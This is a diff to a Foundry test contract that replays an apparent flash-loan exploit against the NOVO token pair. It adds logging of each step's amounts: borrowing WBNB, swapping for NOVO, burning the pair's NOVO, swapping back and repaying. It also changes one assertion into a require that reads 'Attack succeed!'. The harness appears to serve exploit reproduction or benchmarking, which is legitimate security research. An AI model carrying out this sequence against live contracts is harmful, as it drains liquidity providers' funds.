@@ -206,20 +206,33 @@ contract NOVOTestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 17e18);
         borrow_wbnb_owner(17e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", wbnb.balanceOf(attacker));
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb))
+        );
         swap_pair_attacker_wbnb_novo(
             wbnb.balanceOf(attacker),
             pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb))
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", 0.113951614e18);
         burn_novo_pair(0.113951614e18);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", novo.balanceOf(attacker));
+        emit log_named_uint(
+            "amt5",
+            pair.getAmountOut(novo.balanceOf(attacker), address(novo))
+        );
         swap_pair_attacker_novo_wbnb(
             novo.balanceOf(attacker),
             pair.getAmountOut(novo.balanceOf(attacker), address(novo))
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", (17e18 * 1003) / 1000);
         payback_wbnb_owner((17e18 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -242,7 +255,7 @@ contract NOVOTestBase is Test, BlockLoader {
         burn_novo_pair(amt3);
         swap_pair_attacker_novo_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
